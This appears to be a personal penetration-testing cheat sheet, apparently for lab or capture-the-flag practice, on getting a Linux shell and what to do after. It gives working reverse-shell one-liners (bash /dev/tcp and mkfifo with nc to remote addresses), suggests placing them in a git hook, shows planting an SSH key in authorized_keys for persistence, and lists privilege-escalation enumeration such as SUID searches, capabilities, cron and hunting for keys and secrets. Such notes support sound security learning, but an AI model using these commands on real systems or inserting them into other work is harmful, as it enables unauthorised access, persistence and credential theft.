---
title: "Shell"
date: 2023-01-03
modified: 2023-01-04
draft: false
summary: "Getting a shell, then what to do next."
---

{{< hacking-disclaimer >}}

## Establish a shell

[Check payloads all the things for commands](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

## Shell commands

Can run from a script e.g. a git hook. May need a shebang header e.g. `#!/bin/sh`

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1234 >/tmp/f
```

## Got a shell

### First commands to set up terminal

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

OR

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color`
alias ll='ls -lsaht --color=auto'
```

Ctrl + Z (make background process), then...

```bash
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```

### SSH session - authorized_keys

```bash
mkdir -p .ssh
echo 'KEYHERE' | tee .ssh/authorized_keys
```

### Check capabilities

```bash
which gcc
which cc
which python
which perl
which wget
which curl
which nc
which ncat
```

### Check arch

```bash
file /bin/bash
```

```bash
uname -a
```

```bash
cat /etc/issue
```

```bash
cat /etc/*-release
```

### User info

```bash
sudo -l
```

```bash
ls -lsaht /etc/sudoers
```

```bash
groups <user>
```

```bash
env
```

```bash
cd /home
```

```bash
ls -lsaht
```

```bash
ls -lsaR /home/ # Looking for .ssh keys
```

### Check web dir

```bash
cd /var/www/html
ls -lsaht
```

### SUID / GUID escalations

[https://gtfobins.github.io/](https://gtfobins.github.io/)

#### Find SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

#### Find GUID

```bash
find / -perm -g=s -type f 2>/dev/null
```

### Extended capabilities

[getcap, setcap and file capabilities — insecure.ws](https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities)

```bash
getcap -r / 2>/dev/null
```

Commands with capabilities may be restricted by Apparmor. `ls /etc/apparmor.d/` to check

### process spying

- Is there some script doing things that might be interesting?
- Shows what’s recently run.
- Keep it running to see if there are any periodic scripts.

[https://github.com/DominicBreuker/pspy/blob/master/README.md](https://github.com/DominicBreuker/pspy/blob/master/README.md)

`cd /var/tmp/`

Transfer pspy

`chmod 755 pspy`

`./pspy`

### Local network

```bash
netstat -antup
netstat -tunlp
```

### Root running anything?

```bash
ps aux |grep -i 'root' --color=auto
```

### Any interesting files?

```bash
ls -lsaht /etc/
```

```bash
ls -lsaht /var/lib/
```

```bash
ls -lsaht /var/db/
```

```bash
ls -lsaht /opt/
```

```bash
ls -lsaht /tmp/
```

```bash
ls -lsaht /var/tmp/
```

```bash
ls -lsaht /dev/shm/
```

_Anything other than root / shadow here?_

```bash
cat /etc/fstab
```

#### Any config files left behind?

```bash
ls -lsaht |grep -i ‘.conf’ --color=auto
```

```bash
ls -lsaht |grep -i ‘.secret’ --color=auto
```

### Cron

```bash
crontab –u root –l
```

```bash
cat /etc/crontab
```

```bash
ls /etc/cron.*
```

### List all files

Find all files created by a user:

```bash
find / -user miguel 2>/dev/null
```

### Any mail?

`cd /var/mail/`

`ls -lsaht`

### Automated scripts

- [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [Traitor](https://github.com/liamg/traitor)
- `searchsploit -m multiple/local/4713.sh` copies the specified exploit to the local directory.

## Other resources

- [Linux Privilege Escalation – Resources – Siren Security](https://sirensecurity.io/blog/linux-privilege-escalation-resources/)
- [Siren Common](https://sirensecurity.io/blog/common/)
